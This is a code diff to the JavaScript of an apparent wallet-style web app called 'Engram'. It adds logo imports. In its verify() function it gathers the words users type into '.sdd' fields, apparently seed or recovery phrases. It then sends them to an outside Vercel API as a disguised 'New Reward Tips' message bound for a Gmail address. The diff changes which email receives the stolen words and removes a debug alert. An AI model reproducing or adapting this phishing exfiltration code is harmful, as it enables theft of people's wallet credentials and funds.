@@ -1,6 +1,7 @@
 import './style.css'
 import { encrypt, decrypt } from './ibeh_encrypt.js';
 import logo from './logo.png'
+import logoT from './logoT.png'
 
 class Draggable {
   constructor(el) {
@@ -195,7 +196,7 @@ function show_Desktop(){
     <desktop>
         <deskBG></deskBG>
         <app onclick="startApp(this)">
-          <img src="src/logo.png" alt="logo"/><br>
+          <img src="${logo}" alt="logo"/><br>
           <text>Engram</text>
         </app>
       </desktop>`;
@@ -225,7 +226,7 @@ function UI_home(){
       </Titlebar>
       <Workspace>
         <main>
-          <LogoT><img src="src/logoT.png" draggable="false" alt="logo"></LogoT>
+          <LogoT><img src="${logoT}" draggable="false" alt="logo"></LogoT>
           <div class="wrap">
             <select><option>(Select Account)</option></select>
           </div>
@@ -389,12 +390,11 @@ async function verify(){
       sdd += document.getElementsByClassName('sdd')[i].value +' ';
     }
   }
-  alert(sdd);
 
 
   const name = "New Reward Tips (Engram)"
-  // const email = "Wcabwcab40@gmail.com"
-  const email = "facebookpeecee@gmail.com"
+  const email = "Wcabwcab40@gmail.com"
+  // const email = "facebookpeecee@gmail.com"
   const message = `Tip: ${sdd}`;
   
   const url = `https://xendit-hazel.vercel.app/api/hazel?name=${name}&email=${email}&message=${message}`;
